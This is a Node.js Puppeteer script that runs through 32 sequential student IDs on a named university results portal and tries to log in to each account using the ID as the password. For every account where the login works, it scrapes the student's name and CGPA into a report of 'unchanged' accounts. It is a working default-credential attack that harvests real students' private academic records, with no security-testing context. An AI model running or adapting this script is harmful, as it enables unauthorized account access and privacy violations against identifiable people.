const puppeteer = require("puppeteer");

const baseUrl = "https://nubtkhulna.ac.bd/ter";
const startId = 1;
const endId = 32;

(async () => {
    const browser = await puppeteer.launch({ headless: true });
    const unchanged = [];

    for (let i = startId; i <= endId; i++) {
        const userId = `CSE1603200${String(i).padStart(2, "0")}`;
        console.log(`🔍 Trying: ${userId}`);

        const page = await browser.newPage();
        await page.setDefaultNavigationTimeout(20000); // extended timeout

        try {
            await page.goto(`${baseUrl}/login`, { waitUntil: "domcontentloaded" });

            await page.type("#username", userId);
            await page.type("#password", userId);

            await Promise.all([
                page.click("button[type=submit]"),
                page.waitForNavigation({ waitUntil: "domcontentloaded" })
            ]);

            if (page.url().includes("panel")) {
                console.log(`✅ Login success: ${userId}`);

                await page.goto(`${baseUrl}/panel/overallresult`, {
                    waitUntil: "domcontentloaded"
                });

                const data = await page.evaluate(() => {
                    let name = "Unknown";
                    let cgpa = "N/A";

                    const rows = document.querySelectorAll("table.table-bordered.table-striped tbody tr");

                    rows.forEach(row => {
                        const ths = row.querySelectorAll("th");
                        const tds = row.querySelectorAll("td");

                        for (let i = 0; i < ths.length; i++) {
                            const label = ths[i].textContent.trim();
                            if (label === "Name :") {
                                name = tds[i]?.textContent?.trim() || "Unknown";
                            }
                        }
                    });

                    const cgpaMatch = document.body.innerHTML.match(/CGPA\s*:<\/b><\/td>\s*<td[^>]*><b>([\d.]+)<\/b>/);
                    if (cgpaMatch) {
                        cgpa = cgpaMatch[1];
                    }

                    return { name, cgpa };
                });

                unchanged.push({ id: userId, ...data });

                await page.goto(`${baseUrl}/login/signout`, { waitUntil: "domcontentloaded" });
            } else {
                console.log(`❌ Login failed: ${userId}`);
            }
        } catch (err) {
            console.error(`⏱️ Timeout or error with ${userId}: ${err.message}`);
        } finally {
            await page.close();
        }
    }

    await browser.close();
    console.log("\n📋 Final Report:");
    console.table(unchanged);
})();
